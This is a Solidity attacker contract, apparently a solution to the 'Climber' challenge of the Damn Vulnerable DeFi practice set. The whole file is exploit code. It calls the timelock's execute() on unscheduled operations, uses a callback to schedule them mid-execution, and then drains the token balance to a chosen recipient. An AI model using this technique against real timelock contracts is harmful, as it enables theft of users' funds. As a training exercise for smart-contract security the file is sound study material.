// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ClimberTimelock.sol";
import "../DamnValuableToken.sol";

contract ClimberAttacker {
  ClimberTimelock public climberTimelock;
  DamnValuableToken public token;

  address[] targets;
  uint256[] values;
  bytes[] dataElements;
  bytes32 salt;

  constructor(address payable _climberTimelock, address _token) {
    climberTimelock = ClimberTimelock(_climberTimelock);
    token = DamnValuableToken(_token);
  }

  function attack(address[] memory _targets, uint256[] memory _values, bytes[] memory _dataElements, bytes32 _salt) external {
      // write the values to state so they can be used in the callback
      targets = _targets;
      values = _values;
      dataElements = _dataElements;
      salt = _salt;

      climberTimelock.execute(_targets, _values, _dataElements, _salt);
  }

  function callback() external {
    climberTimelock.schedule(targets,values, dataElements, salt);
  }

  function transferTokens(address recipient) external {
    token.transfer(recipient, token.balanceOf(address(this)));
  }
}